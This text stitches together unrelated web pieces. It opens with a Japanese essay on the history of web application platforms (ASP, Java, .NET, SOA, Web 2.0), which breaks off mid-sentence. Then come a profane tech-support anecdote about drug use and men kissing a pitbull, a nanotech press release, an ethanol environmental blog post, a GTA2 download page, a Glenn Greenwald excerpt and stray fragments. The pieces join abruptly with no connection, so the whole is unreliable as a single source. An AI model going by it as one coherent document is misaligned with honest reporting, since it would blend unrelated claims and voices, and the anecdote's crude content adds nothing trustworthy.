Apacheの場合、モジュールと呼ばれる独立したライブラリを直接呼び出す機構が用意されている。そのため、CGIで外部プログラムを呼び出す代わりに、あらかじめプログラミング言語とその実行環境をモジュールとしてApacheのプロセス内に組み込む方法を採用することでプロセス実行のオーバーヘッドを解消できる。このため、CGIで利用されるPHPやPerlなどはMOD_PHPやMOD_PERLといったモジュールを提供している。言い方を変えるとモジュールを利用することでPHPやPerlによってサーバーサイドスクリプティングが可能となるということである。ただしセッション管理のための機構はプログラミング言語とその実行環境側で用意することになるため、開発性の良さは個々のプログラミング言語のセッション管理ライブラリに依存することになる。たとえばPHPについて言えば、PHP4以降に洗練されたセッション管理機構を組み込んだことにより、Webアプリケーション開発環境としての磐石の地位を築いている。
IIS
マイクロソフトは、比較的早い時期からCGIの実行効率の悪さという問題点に対するソリューションを提供している。これは、Windows NTが当初からスレッドをサポートしていたことと無縁ではあるまい。このため、CGIのように外部プロセスを実行するのではなく、IIS内のスレッドでWebアプリケーションを実行するように設計することが自然だったと考えられるからである。
1996 年 のIIS2.0 （Windows NT4.0に搭載）は、ISAPIと呼ばれるAPIを提供することで、人気があったVisual C++のMFCと呼ばれるクラスライブラリを利用したマルチスレッド用Webアプリケーションの開発／実行環境を提供した。しかし、C++のプログラミングの難しさやマルチスレッドアプリケーションのデバッグのしにくさなどの複数の要因からそれほど広く成功したとは言えない。
マイクロソフト のIISが企業システム のWebアプリケーションプラットフォームとして支持を受けることになるのは、1997年に発表されたNT
Option packからである。こ のWindows NT4に対するアドインに含まれているIIS
3.0に はASP （Active Server Page）と呼ばれるISAPIアプリケーションが搭載されていた。IIS2.0の頃のISAPIアプリケーションをユーザーに開発させる方法から、ユーザーが開発したサーバーサイドスクリプトを実行するISAPIアプリケーションをマイクロソフトが用意するという構造である。
ASPは、VBScriptまたはJScript（マイクロソフト社のJavaScript実装）のいずれかを利用した埋め込みHTMLの実行エンジンである。この場合、セッション管理のための機構はスクリプトから操作可能なオブジェクトの形式でプログラムに提供されている。また、データベースと簡単にインターフェイスするためのADO（Active Data Object）と呼ばれるオブジェクトも同時に提供された。
ここまででお気づきのように、PHPとASPには共通点がある。それは、
埋め込みHTML
サーバーサイドスクリプトとして実行可能
データベースへの容易なアクセス手段
組み込みセッション管理機構
である。
本節の最初に 、Webアプリケーション環境で重視された点として実行効率とセッション管理の2点を挙げたが、実際に成功したWebアプリケーションの開発環境にはそれに加えて、データベースアクセス機構と開発容易性の2点が不可欠であったことがうかがえる。
Java
現在の企業システムにおけ るWebアプリケーション開発の主流と呼んでも過言ではないJavaについては事情は多少複雑である。
Javaは仕様制定のためにはJCPと呼ばれるベンダー間の合意形成のためのプロセスを経なければならないことが、オープンソースとして身軽に開発が可能なApache、PHPといったソフトウェアや、1社でOS、開発言語、サーバーアプリケーションのすべてを開発しているマイクロソフトに比較してどうしても後手に回らざるを得ないからである。
年代順 にJavaにおけるWebアプリケーションへのコミットを以下に示そう。
1997年に 、JavaServerと呼ばれる仕様が発表された。これはIISに対するISAPIアプリケーションのように、マルチスレッドで実行されるJavaのクラスに関する仕様で一般にServletと呼ばれる実装方法である。
1998 年には 、Enterprise JavaBeans（EJB）が発表されている。EJBはTPモニターを含む分散オブジェクトとデータベースのオブジェクトマッピングについての仕様である。
1999 年には 、JavaServer Page（JSP）を発表。JSPは、ASPやPHPのようにHTMLへJavaプログラムを埋め込むための仕様である。
1997 年 のASP に遅れること実に2年である。おそらくマイクロソフトのWindows NTがASP発表時点で基幹系ホストコンピュータとしての地位を確立していたら、現在とはずいぶん様相が異なっていたと考えられる時間差であるが、この時点でのWindows NTが部門サーバーからせいぜい基幹系のフロントエンドに配置されるWebサーバー程度にしか認知されていなかったことなどから、この速度でも問題がなかったといえるであろう。
なお 、J2EE（Java2 Enterprize Edition）と呼ばれるJava環境は、JavaServer、EJBなどの複数の仕様をある特定の時点でバージョン合わせをした仕様の集合体である。
マイクロソフトが2000年に発表し、2002年にリリースした.NETは、それまでにマイクロソフトが培ってきたVisual C++、Visual Basicといった開発言語、ADOなどのコンポーネント、ASPなどの実行環境を、Javaと同様な仮想マシンの上に再構築した壮大なプラットフォームである。
. NETが提供するWebアプリケーション環境を、ASP.NETと呼び、従来のASPが持つ埋め込みHTMLを残しながら、より洗練されたVisual BasicのようなイベントドリブンモデルをWebアプリケーションの世界に持ち込んだものである。
ここで重要な点は、既 にASPによって一定の成功をおさめたマイクロソフトがなぜ埋め込みHTMLという手法から離れたのか、である。
その理由の考察については次節にゆずるが、出遅れた感があるJavaが現在の企業システムの主流となった理由と重なる点があるということは指摘しておこう。
その他のアプリケーション環境
ティム・バーナード・リーにより最初のWWWが実装されたNeXTが1996年に世に出したのがEnterprise Objects Framework（現アップルのWebObjects）というObjective-Cを利用したWebアプリケーションサーバーである。
WebObjectsはそれまでのルールを完全に変える独特なWebアプリケーションの実行環境を提供する。Webアプリケーション開発時に問題となるHTTPというステートレスな通信にステートを持たせてアプリケーションとしての一貫したフローを構成するのが個々のアプリケーションの役割だった1996年という時代に、オブジェクト指向とフレームワーク技術によってアプリケーション開発者がステートを意識する必要をほとんどなくしてしまったからだ。また、RDBMSとエンタープライズオブジェクトのマッピングやSQLの自動生成なども行う。WebObjects相当の環境を他に求めるためには2002年のASP.NET（マイクロソフト）や2004年のJavaServer
Facesを待たなければならないのだから、その先進性には目を見張るものがある。なお、WebObjectsを開発したジャック・グリーンフィールドは現在マイクロソフトでSoftware Factoriesのアーキテクトを勤めている。
WebObjectsは当初からJavaをサポートしていたが（2001年に完全にJavaベースとなる）、主となる開発言語がObjective-Cという現在では主流とは言えない言語であったこと、アップルのシェアが低いことなどからほとんど普及していない。とは言うもののアップルストアとiTMSという2つの大規模サイトがWebObjectsで構築されている事は指摘しておこう。
また、フラッシュで知られているマクロメディアは、ColdFusionというPHPのような埋め込みスクリプト型のWebアプリケーション環境を出荷している。ColdFusionは1994年頃にAllaire社が開発した製品であるが2001年にマクロメディアに買収された。
これらの製品はいずれも優れた特徴を持つが、独自の環境であることやシステムとは別に購入が必要となることからいずれも主流とはなり得ていない。
インターネット上 のWebアプリケーションと企業システムのWebアプリケーションの差
最初に押さえておかなければならない点は、インターネット上のWebアプリケーションには2種類あることと、これらがいずれも企業システムの特に基幹系システムでのWebアプリケーションのあり方とは全く異なるということである。
インターネット上 のWebアプリケーションは大きく次の2種類に分類できる。
Eコマース
サービス
前者の特徴は、信頼のおける通信、カタログ、確実な配送であり、実際のところWebアプリケーションが占める役割はそれほどは大きくは無い。たとえば、Amazonのページ数と企業システムのページ数は一般論としてどちらが多いか考えたことがおありだろうか？
Amazonのページは商品ごとに出てくるため一見すると全商品数以上あるように見えるかも知れない。しかし実際には表示する内容が異なるだけでそれほど多いわけではないのだ。筆者もきちんと数えたわけではないし内部のアプリケーション構造がわかるわけではないのであくまでも推測に過ぎないが、表紙、商品、カートの内容表示、確認画面、配送指定など、アフィリエイト関連やサービスのためのページを除けばせいぜい10数ページ程度ではないかと推測される。
それに対して企業システム、特に基幹系システムをWebアプリケーション化するということは、従来紙ベースで出力していたレポート数以上のページ数が必要だということを意味する。これは、間違いなく企業システムのほうが開発しなければならないページ数が多いということだ。
その一方で、ページの変化――単にレイアウトのような見た目のデザインだけではなく、表示する情報量や質の変化などを含む――については、Eコマース側のほうが激しいはずである。企業システムの帳票の代替となるページが頻繁に変化するということは、そのアプリケーションの意味からもそれほどはあり得ることではない。
後者のサービスは、どちらかというとインターネット固有のWebアプリケーションである。たとえばGoogleのような検索サイト、ミクシのようなSNSサイト、はてなのような独特なコミュニケーションサイト、MSNやYahooのようなポータルサイトがこれにあたる。収益モデルのほとんどが広告に依存するこれらのサービスの特徴は、次々に打ち出す新しいサービスの提供であり、日々進化する姿そのものである。その特徴をGoogleのサービス提供スタイルから永遠のベータ版と呼ぶことができよう。現在日本最大のSNSサイトのミクシもトップページにはmixi βversionと誇らしげに記されている。これは、企業システムではちょっと考えられないことだ。
なお、サービス分野 のWebアプリケーションと言っても必ずしも企業システムとは無縁ということはない。たとえばサイボーズといったベンダーが提供するグループウェアはこの系統のアプリケーションであるし、企業内にBlog（シックスアパートのMovable Typeが有名である）をコミュニケーションツールとして取り込といった動きも最近では見ることができる。
インターネット上 のWebアプリケーションと企業システムとしてのWebアプリケーションの差がはっきり分かれたのは、良くわからないがクライアントサーバよりもROIが低減できるはずだからWebベースに変えようという、インターネットでうまく行くから企業システムでも真似をしてみようというレベルから、基幹系システムにWebアプリケーションを取り込むということがどのようなことかが正しく認識されてきたからに他ならない。
そもそも、開発しなければならないアプリケーションの種類が全く異なるのだから同じような方法論を適用することはできないと考えるほうが自然である。
最初に、アプリケーションの構築方法について言及したのは1998年にマイクロソフトが打ち出したWindows DNAだと考えられる。
Windows DNAは、ASP、ADO、MTS、MSMQといったマイクロソフトの複数のテクノロジーによってクライアント―サーバを単にWebで構築するということを超えて、企業システムを構築するためにどのようなテクノロジーをどのように配置するか、の設計指針（今風に言えばアプリケーションアーキテクチャ）を示したものだ。
Windows DNAに対応してアプリケーションアーキテクチャを示したものが同じ1998年のEJBを含めたJ2EEと言えよう。
さらに、2000年にApacheファウンデーションのJavaプロジェクトJakartaからリリースされたStrutsで、MVC（JSPタイプ2）によるWebアプリケーション構築という文字通り骨組みが提供されたことで、Webアプリケーション開発にはフレームワークの適用が必須という機運が生まれることになった。
これらは、いずれも大量 のWebアプリケーションを多人数で構築する、いわゆる大規模プロジェクトを前提とした場合に求められるものだったのである。
このよう なWebアプリケーション開発手法が、少数精鋭のネットベンチャーによって素早く斬新なサービスを次々と提供するというインターネットの開発手法と異なるのはある意味当然である。
その一方で、このような手法の限界も見えてきた。インターネット上のWebアプリケーションが永遠のβ版なのは必ずしも次々に新機軸を打ち出すことだけが原因ではないということだ。それは既に10年にもおよぶインターネットを利用するコンピュータの成熟（あるいは多様化）に起因する。
たとえば、同じIEという名前のブラウザーであってもバージョンどころかサービスパックや場合によってはセキュリティフィックスのアップデートによっても挙動が異なるということや、ダウンサイジングによってもたらされたメインフレームからオープンシステムへの移行が真に意味する点が明らかになったということである。オープンシステムの収益モデルは頻繁なバージョンアップ――当然、それをバージョンアップする理由を裏打ち可能なサービスの追加や変更を伴う――だ。このことは、メインフレーム時代のように安定したプラットフォームが望めないということを意味する。実際に動かしてみるまではAPI説明書に書いた通りの挙動をするのか、あるいはテスト用に利用した環境と同等の動作をするのか、そういったことが必ずしも予見できるわけではないのだ。もちろん、企業システムであればすべての更新を停止してクライアントの動作を固定するという選択ができないわけではない。しかし、インターネットと企業が結合されるようになったため、セキュリティ上の問題に対する更新まで行わないわけにはいかず、そして収益モデルとの兼ね合いからサポート期間

も う1つの問題は、ユーザー側の意識の変化である。家庭でインターネットを利用する環境と、企業でイントラネットを利用する環境で、利用しているハードウェアやソフトウェアが同じことによって生じる錯誤である。前者は永遠のベータ版が許容される世界で、後者はそうではないにも関わらず、後者に前者と同等かそれ以上のフレキシビリティを当然のように求めることになるからだ。
このように、企業システムの開発は大規模プロジェクトでありながら、変化を柔軟に受け入れる必要が生じてきた。EJBやStrutsで、柔軟性を確保するために選択された技術はXMLである。どのプログラムを実際に動かすかを実行時まで遅延させるためのパラメータとしてXMLを利用するという手法である。また、プログラム自身を柔軟に構成可能とするためにJavaでシステム開発をしてきたグループによって、2004年から草の根的に提案されたのがDI（Dependency Injection――依存オブジェクト注入）であり、AOP（Aspect Oriented Programing）である。
DIとAOPは、実際に利用するプログラムをコンポーネントとして分離し、実行時に結合するためのシンプルな機構である。利用することで、後からのコンポーネントの交換を比較的簡単に行うことができるようになることや、変化することが考えられないコアなコンポーネントと、後から変更されることが予期されるコンポーネントをあらかじめ分離して開発することで変更のためのダメージを最小限に押さえたり、処理の分離度を高めたりするための技術である。
同様に開発プロセスとして、最初から細部まで固定的に設計せずに後回しできる部分は後回ししたり、あるいは細かい単位で実装を繰り返す（ちょうど雪ダルマを作るように何度も転がして雪を付けて行くようにしてシステムを構築する）手法を取り入れることも行われるようになった。
ただ、これらの手法によっても問題が完全に解消できるわけではないということも事実である。たとえばXMLによるパラメータは実行時まで記述ミスがあってもわからないという問題がある。また、柔軟な構成が必要となればなるほどXMLによる動的な設定が増えていくため、固定的であるべき部分と柔軟でなければならない部分の境界があいまいになり結果として不安定なシステムとなってしまうということもあり得る。
企業システム開発の将来展望
企業システム、特に基幹系へのWebアプリケーションの導入は上記のように種々の問題点を抱えている。
これを打開するための技術のうち、現在既に完成しているものから近い将来に出現する可能性があるものまでを列挙する。
プログラムの中に動的な構成のための情報を埋め込む技術である。動的な構成情報をすべてXMLという単なるテキストに持つのではなくプログラムそれ自身が提供できるものはプログラムの中に埋め込むことでミスを無くすことや、人間が手で設定しなければならない要素を減らすことが可能となると考えられる。たとえばSeasarファウンデーションのS2のようなDI＋AOP環境では既にアノテーションを利用することでXMLの必要性を大幅に減らすことに成功している。
関数型言 語
JavaやC#、VB.NETといった手続き型言語はプログラムの中で状態を意識する必要があり、これはあまりレベルが高くないプログラマにとってバグを入れやすい原因となると考えられる。また、状態によって実行結果が異なってくるためテストの有効性に限界があることになる。関数型言語（Haskel、F#など）は状態を持たないため、結果はプログラムに記述したそのものとなる。このため、関数型言語が注目されている。
DSL
ドメイン特化言語 （Domain Specific Language）には言語内DSL、またはプログラム自動生成言語という2種類の実現方法があるが、いずれの場合も、直接プログラム言語そのものを利用してプログラムするのではなく、より高次元の処理の記述に特化することでプログラミングにまつわるバグの発生や開発に必要となる工数を抑制したり除去することが目的である。マイクソフトのSoftware Factoriesの中心にはDSLの開発が含まれる。
特化クライアン ト
ClickOnce（マイクロソフト）、JWS（Java）などのクライアントアプリケーション配布技術によって配布／バージョンアップ問題を解決したブラウザーを利用しないWebアプリケーション。この場合、Webサーバーとの通信にはSOAPなどのメッセージングを利用することになる。
SOA
SOA （Service Oriented Architecture）は、端的に言えばアプリケーションを一枚岩で構成せずに、サービスという単位（大雑把には給与計算、勤怠管理、のように一言で呼べる処理のまとまり）で開発し、さらにサービス間のインターフェイスをXMLメッセージのようにシンプルなものにすることで、システムの構成管理を柔軟にするということである。当初、ベンダー固有の製品やSOAPと組み合わせて語られることが多かったため誤解が生じた面もあったが、現在ではアプリケーションアーキテクチャを決定する場合にサービスという単位の考慮は必須となっている。
2001 年を象徴するのが 、Amazon.comが10-12月決算で創業以来初の黒字（営業利益5,900万ドル。なお前年同期は6,000万ドルの営業損失）を達成したことである。Amazonの特徴は、購買履歴やクリック履歴を最大限に利用して、もっと購入させようとお勧めをしてくることにある。インターネット企業としてのAmazonの真価はこのお勧めの確度にある。
また、1997年に創業したGoogleが単に検索ポータルのトップになっただけではなく（2005年現在、米国で37％、ただし日本ではYahoo!が50％を超えてトップ）、Gmail、Google Mapなどのアプリケーションを次々とリリースした。その過程でAjax（Asynchronous JavaScript ＋ XML）と呼ばれるJavaScriptを徹底的に活用したクライアントサイドスクリプティング技術が注目を浴びることになった。
AjaxはIEに統合されている非同期XML通信コンポーネントを利用してサーバーと会話することで動的にクライアント画面を再構成する技術である。
既に触れたが現在インターネット上のWebアプリケーションはECサイトを別にすればサービスの提供がほとんどである。サービスを支えるのは利用者の数と、インターネット上に遍在するHTML群である。たとえば、はてなの20万人、ミクシの200万人といったユーザー数や、Googleが収集した膨大なデータ量は、そのものが巨大なナレッジであり、これらのサービス提供企業の価値である。しかもこれらのデータはサービスを提供し続ける限り自動的に増加していくのである。サービスの目的が広告収入にあるのであれば（どこまでインターネットへの依存度が高まっても最終的には物の購入は必須であるため、広告が不要化することはない）、どのような広告を表示するかを判断するためのデータ量が多ければ多いほど、ユーザーを特定できればできるほど、質の高い広告をユーザーへ送ることができる。その結果広告の精度を上げることができ、結果的に広告収入をより増やすことが可能となる。
Web 2.0という技術的な意味はないスローガンは、このようなサービスがサービスを提供することにより内部情報を自動的に増加させ、それにより価値を膨らませることを指す言葉といって良いであろう。
まとめ
単なるインターネットの真似事に過ぎなかったイントラネットがインターネットモデルを離れて巨大な情報システムの構築に進んでいるように、あるいはWeb
2.0が非常にスマートな方法でサービスから収益を上げているように、WWWの15年間は絶え間ない進化の連続だった。ティム・バーナード・リーが1989年にナレッジの集合をHTTP、HTML、URIというシンプルな3つ組みで統合しようとした理想は、HTMLそのものではないかも知れないが、企業の基幹系情報システムというナレッジ、あるいはWeb 2.0企業のユーザー群というナレッジの統合という形で着実に定着しているように見える。

Hookers , Pitbulls , Weed , Meth , Beer , and Screaming
Hopefully this story wo n't inspire moral controversy ...
My heart sank the second I laid eyes on it .
Surrounded by a chain - link fence , this abode of horrors came complete with two massive pitbulls prone to jumping so high you almost get a doggie - dickslap and were foaming at the mouth , a beanbag chair covered in mud on the lawn , no walkway ( also mud ) , and apparently a free legal dispute with the Times judging by all of the unopened papers strewn about .
I had been here before , and all you need to know about that experience is that since then , all technicians in my area have specifically requested to NOT be sent there anymore .
To my knowledge that is the only client that has happened to in my area .
After navigating the yard , which was only missing a broken down dodge and some red party cups , I went in .
The place looked like the floor of a dog hair coat factory .
Newspapers , porn , beer cans , hair , food , dog food , and pizza boxes were all strewn about , and sitting on the dilapidated couch was what I at the time had to assume was a prostitute .
She was no older than thirty , but was so worn out by life she could have passed for 45 .
Leathery skin from way too many tanning sessions , crazy brown / black wiry hair , wearing what basically amounted to a belt for a skirt , and strung out like the slot jockeys at a shitty casino .
She waved amicably to me and said " HI ! " like she had known me for years .
I had a brief suspicion this was all an elaborate ruse to lure me into a crazy gang - sex fantasy and if I ran the guy would sic the pitbulls on me .
Fortunately he gestured in the direction of the computer and said " there it is , fucking thing crashed , just get my porn off it , I 'm going to the store " and left .
There was n't a TV in the livingroom , so I was forced to endure some largely one - way small talk with the woman , lets call her Meth .
" So , how do you know Bob ? " Drowsy , but friendly .
" I do n't really know him , I 'm just his computer guy . "
" Right but how do you know him ? "
Increasingly vacant .
" He called my company ... "
" Ohhh .
When did you meet ? "
Totally gone now .
" About six months ago . "
" Cool !
I 've known him that long .
He 's SO GREAT .
How did you meet ? "
It just kind of trails on from there .
She was beyond the point of high that I would have suspected her of hitting on me , so I just said enough so she would continue on .
In retrospect I should have paid attention more because it probably would have been funnier .
Bob came home with some beer and offered me some , but I wanted to make sure I was fully aware of my surroundings .
See what I go through for you people ?
He put the dogs outside , and his brother came out and asked me some stupid questions .
Bob and his brother look exactly same , except his brother Steve has about 50 pounds on him .
Both mid-thrities , really thick Brooklyn accent .
The sprinklers came on .
Steve panicked .
" DID YOU PUT THE DOGS OUTSIDE ? "
Bob : " Yeah , so ? "
Steve : " WHAT IF HE SLIPS ?
HES AN OLD DOG AND HE'LL HURT HIMSELF "
Bob : " Dude , he's out there everyday , shutup "
* Yelping *
STEVE : " YOU MOTHERFUCKER "
Steve runs outside and starts SCREAMING at the top of his lungs , " YOU MOTHERFUCKER , HE SLIPPED !
HE'S HURT !
OH GOD HIS ANKLE , YOU MOTHERFUCKER I'LL FUCKING KILL " ( at this point he is crying ) " YOU LOOK WHAT YOU DID OH MYFUCKINGGODLOOKATYOU OH NO OH NO OH NO YOU BASTARD , YOU RAT FUCKING BASTARD " Steve comes in with the pitbull in his arms , and puts him down .
The dog is fine , just a slight limp .
The dog promptly comes over and jumps on me .
STEVE : " YOU RAT BASTARD " ( crying like a baby )
Bob : " The dog is fine shut the hell up . "
This banter continues for literally fifteen minutes .
Meth is just staring at the wall .
I 'm backing up really gross internet porn .
The dog licks my pants .
Steve screams .
Steve crys .
Bob lights up a bong load .
Steve begins to make out with the dog .
We have lost cabin pressure .
He made out with a pitbull .
Not like smooch , HE WAS SHOVING HIS TONGUE DOWN ITS THROAT WITH GREAT VIGOR .
FOR LIKE THREE MINUTES .
This abomination ends , and five minutes later , Bob MAKES OUT WITH THE SAME DOG
THEY ARE COVERED IN DOG SLOBBER
TO THEM THIS IS NORMAL
I finish the last porno .
Bob pays me in cash and as I leave I tell my office that " Yes , I would love to go back to Bob 's house if he ever needs my help again . "
Animals and porn , welcome to tech support .
A University of Alberta research team has combined two fields of study in nanotechnology to create a third field that the researchers believe will lead to revolutionary advances in computer electronics , among many other areas .
Dr. Abdulhakem Elezzabi and his colleagues have applied plasmonics principles to spintronics technology and created a novel way to control the quantum state of an electron 's spin .
The new technology , which the researchers call spinplasmonics , may be used to create incredibly efficient electron spin - based photonic devices , which in turn may be used to build , for example , computers with extraordinary capacities .
" We 've only just begun to scratch the surface of this field , but we believe we have the physics sorted out and one day this technology will be used to develop very fast , very small electronics that have a very low power consumption , " said Elezzabi , the Canada Research Chair in Ultrafast Photonics and Nano - Optics and an electrical and computer engineering professor at the U of A .
Elezzabi's work addresses a number of challenges that , to this point , have hindered further advancement in computer electronics , such as in the creation of smaller devices .
One such challenge is that as traditional , silicon - based semiconductor devices approach the nanoscale , the laws of quantum physics take control over their performance ( specifically the flow of charges - - i.e. electrons ) and render them inoperable .
Researchers in the field of spintronics have tried to address this problem by building metal - based devices that harness the magnetic quantum properties of the spin of electrons .
Although the spintronics field is barely a dozen years - old , some devices that incorporate spintronics technology are already on the market .
The field of plasmonics , which is even younger than spintronics , involves the transfer of light electromagnetic energy into a tiny volume , thus creating intense electric fields -- a phenomenon that has many scientists rethinking the laws of electromagnetics on a nanoscale .
The plasmonics field has many wide - ranging applications , from guiding light through metal wires , to bio-sensing , to making objects invisible to the eye .
One of the main challenges for plasmonics researchers is finding a way to propagate light over a long distance through solid materials .
However , Elezzabi and his colleagues , U of A graduate student Kenneth Chau and Dr. Mark Johnson of the U. S. Naval Research Laboratory , have successfully combined plasmonics and spintronics in a way that puts plasmonics in a new light , and puts a new spin on spintronics .
Working with gold and cobalt samples , Elezzabi and his team were able to demonstrate a plasmonically - activated spintronic device that switches light on and off by controlling electron spins .
Also , they believe that with a slight alteration of the sample structure the effect is non-volatile , meaning that any given result can be maintained indefinitely without the necessity of a power source .
" With the development of this technology I envision a move from semiconductors [ silicon chips ] to metal based electronics with light - driven circuits , " Elezzabi said .
The research was published recently in the academic journal Physical Review Letters , and the researchers have filed for a patent for the applications they have developed .
" To me this is almost a natural evolution of the two fields .
I 'm actually surprised that no one else looked around and saw what others were doing and combined the two before we did , " Elezzabi added .
" This opens up a lot of possibilities ; this is just the beginning . "

The feedback I received on the previous posting on ethanol use and foreign oil displacement was very valuable in helping me to identify poorly communicated points , and make some key edits .
I am hoping for the same kind of feedback on the present offering .
I would also ask readers to take a look at the questions I have tackled in the FAQ , and let me know if there are glaring omissions , errors , typos , or items requiring additional clarification .
I will continue to post some portions of the FAQ here for feedback , with the intent of posting a finished product within a month or so .
And although it seems like all I have been posting on lately is ethanol , I do n't expect that trend to continue following completion of the FAQ .
As I continue to work on an Ethanol FAQ , I again wanted to solicit feedback from readers on the following question :
There are environmental benefits , as well as negative environmental consequences from using ethanol as fuel .
If the ethanol is produced from industrial corn farms , more negative environmental consequences can be added .
Because of ethanol 's marginal energy balance , there is a marginal reduction in greenhouse gas emissions per distance driven .
Researchers have also found that ethanol produces less carbon monoxide when it is burned in an internal combustion engine .
On the other hand , ethanol raises the vapor pressure when blended with gasoline , which causes an increase in smog .
In an August 1 , 2007 article in the Houston Chronicle ( now archived , but available at the following link ) :
Five questions with Cal Hodge
Q : We 're already using more ethanol in our fuel now , because of the outcry over the fuel component methyl tertiary butyl ether or MTBE and its propensity to foul groundwater .
You had warned that replacing MTBE with ethanol could hamper efforts in cities like Houston to improve air quality because of these problems with volatile organic compounds and nitrogen oxides .
So has that actually happened ?
A : Yes , it has happened .
Los Angeles is the cleanest example .
They began switching from MTBE to ethanol in 2001 .
But when they made their major switch in 2003 , there was a significant decrease in air quality .
They basically stopped making progress toward attainment on EPA 's ozone standards when they switched to ethanol .
When using MTBE , with the cars getting cleaner each year , coupled with a very clean fuel , Los Angeles was on a straight - line path toward attaining EPA 's air standards by about 2002 or 2003 .
Now that they have switched to ethanol , the trend line indicates nonattainment for many years to come .
A 2007 research paper by Stanford University professor Mark Jacobson echoes that claim :
Effects of Ethanol ( E85 ) Versus Gasoline Vehicles on Cancer and Mortality in the United States
In this paper , Professor Jacobson studied the potential impact to air quality as more E85 vehicles hit the roads , and he concluded :
" In sum , due to its similar cancer risk but enhanced ozone health risk in the base emission case , a future fleet of E85 may cause a greater health risk than gasoline .
However , because of the uncertainty in future emission regulations , E85 can only be concluded with confidence to cause at least as much damage as future gasoline vehicles .
Because both gasoline and E85 emission controls are likely to improve , it is unclear whether one could provide significantly more emission reduction than the other .
In the case of E85 , unburned ethanol emissions may provide a regional and global source of acetaldehyde larger than that of direct emissions . "
In addition to the mixed environmental impact of directly burning ethanol as fuel , industrial corn farming has significant negative environmental impacts .
From a 2006 paper that evaluated ethanol and biodiesel :
Environmental , economic , and energetic costs and benefits of biodiesel and ethanol biofuels
Both corn and soybean production have negative environmental impacts through movement of agrichemicals , especially nitrogen ( N ) , phosphorus ( P ) , and pesticides from farms to other habitats and aquifers .
Agricultural N and P are transported by leaching and surface flow to surface , ground , and coastal waters causing eutrophication , loss of biodiversity , and elevated nitrate and nitrite in drinking - water wells .
Pesticides can move by similar processes .
The markedly greater releases of N , P , and pesticides from corn , per unit of energy gain , have substantial environmental consequences , including being a major source of the N inputs leading to the ‘‘ dead zone ’ ’ in the Gulf of Mexico and to nitrate , nitrite , and pesticide residues in well water .
Moreover , pesticides used in corn production tend to be more environmentally harmful and persistent than those used to grow soybeans .
Two additional factors not discussed in the article are 1 ) .
Industrial corn farming depletes the topsoil , putting future generations at risk :
Peak Soil :
Why cellulosic ethanol , biofuels are unsustainable and a threat to America
Row crops such as corn and soy cause 50 times more soil erosion than sod crops [ e.g. , hay ] or more , because the soil between the rows can wash or blow away .
If corn is planted with last year 's corn stalks left on the ground ( no - till ) , erosion is less of a problem , but only about 20 % of corn is grown no - till .
Soy is usually grown no -till , but insignificant residues to harvest for fuel .
2 ) . Corn farming and subsequent conversion to ethanol consume enormous amounts of fresh water :
Experts Differ About Ethanol - Water Usage
In this article , David Pimentel is the pessimistic expert who claims that when you add in the water required to grow the corn , it takes 1,700 gallons of water per gallon of ethanol produced .
The " optimist " in the article , Derrel Martin , an irrigation and water resources engineer , said :
Martin said the question of whether increased corn production and the irrigation it requires will overburden the state 's water supply is an important one that does not yet have a clear answer .
Additional research has been reported by two Colorado researchers :
Biofuels : The Water Problem
In late June , two Colorado scientists , Jan F. Kreider , an engineering professor at the University of Colorado , and Peter S. Curtiss , a Boulder - based engineering consultant , presented their peer - reviewed report , “ Comprehensive Evaluation of Impacts from Potential , Future Automotive Fuel Replacements ” at a conference sponsored by the American Society of Mechanical Engineers .
The two found that producing one gallon of corn ethanol requires the consumption of 170 gallons of water .
That figure includes the amount needed for all irrigation and distillation .
For comparison , the two scientists estimated that each gallon of gasoline requires just 5 gallons of water .
If Kreider and Curtiss are right , the 5 billion gallons of corn ethanol produced in America in 2006 required more water than production of the 140 billion gallons of gasoline the U.S. consumed that year .
Ethanol proponents have largely downplayed the negative environmental impacts of increased ethanol production , while emphasizing the positive impacts .
But by ignoring the negatives , all of us , and future generations , are being put at risk .
Personal Note
Some of you may have noticed that I have n't been contributing much lately , nor posting with much frequency on my blog .
I explained the reasons for this in a recent blog posting , but I just want to reiterate the point here .
In an effort to more efficiently allocate my time , I am limiting my writing efforts .
It had gotten to the point that I was literally working 45 hours a week at my regular job , 45 hours a week on my blog , and my family was wondering why I was n't doing more things with them .
I had considered the idea of just stopping cold turkey , but I believe the issues that we discuss and debate are of paramount importance .
But , so are the other things in my life .
So , I have come to a compromise solution .
In order to eliminate the things that consume most of my time , I have essentially stopped participating in the comments sections ( here and on my blog ) , I have taken my e-mail address offline , and I am limiting myself to writing in the early morning when I usually have some time before the family wakes up .
What I have told them is that I intend to keep writing , albeit greatly scaled back .
They are very supportive of what I am trying to accomplish ( in fact , my 13 - year old daughter told me yesterday that she wants to learn to be more environmentally responsible ) .
My intent is for my writing to be transparent to my family and my employer .
If I can't manage that , I will have to quit altogether .
But I will manage it .
Where can I download GTA2 ?
GTA2 v11.44 ( Windows 10 compatible * ) – [ 17MB ]
I recommend installing to “ c:\games ” or your documents folder .
Installing to “ c:\program files ” is not a good idea since that folder is often protected by Windows and may prevent GTA2 and GTA2 Game Hunter from writing to the folder .
If GTA2 crashes on launch then right click on the icon and select “ Run as administrator ” .
The installer does n’t create any desktop shortcuts or start menu items , so you ’ll have to do that yourself .
Running GTA2 in Windows 98 / ME compatibility mode will work around a restart crash ( speedrunners will know that crash well since they restart rapidly ) .
If you want to play GTA2 on Linux , read this guide .
* May require running as admin , changing folder permissions or offering a sacrifice to the GTA2 gods .

Glenn Greenwald :
As we learned from both our Senate and House last week , in the United States we must never " attack the honor and integrity . . . of members of the United States Armed Forces . "
All good patriots from both parties agree on this .
That is why I was so shocked and outraged -- and more than a little upset -- when I went to FoxNews.com this morning and saw this :
I naturally assumed that the " disgraceful military leaders " attacked by the Fox headline must be those of another country , not those of the United States leading our Nation , putting themselves in harm 's way , during a Time of War .
Yet when I clicked on the item , this is the anti-military filth that I found :
And the text of the article -- by Fox News Contributor and frequent O'Reilly guest David Hunt -- is even more Despicable , as it repeatedly attacks the honor and integrity of members of the United States Armed Forces in one smearing paragraph after the next , beginning with this first sentence :
Beating , spraying , and tazering non-violent protestors against the FTAA ( Free Trade Area of the Americas ) .
Number of American deaths per year that result directly or primarily from the following selected causes nationwide , according to World Almanacs , Life Insurance Actuarial ( death ) Rates , and the last 20 years of U.S. Surgeon Generals ' reports .
As we all inevitably know , there are folks out there who will swear up and down that marijuana kills .
However , there is also a pretty strong movement saying that marijuana is not directly responsible for any deaths .
Chances are good that the staff over at Axis Residential Treatment see more clients for cocaine , alcohol , and other substances , than they do for marijuana .
Who knows ?
Luckily we have this nifty little chart to help us out .
Homemade Javascript Editor , Interpreter , whatever .
Description
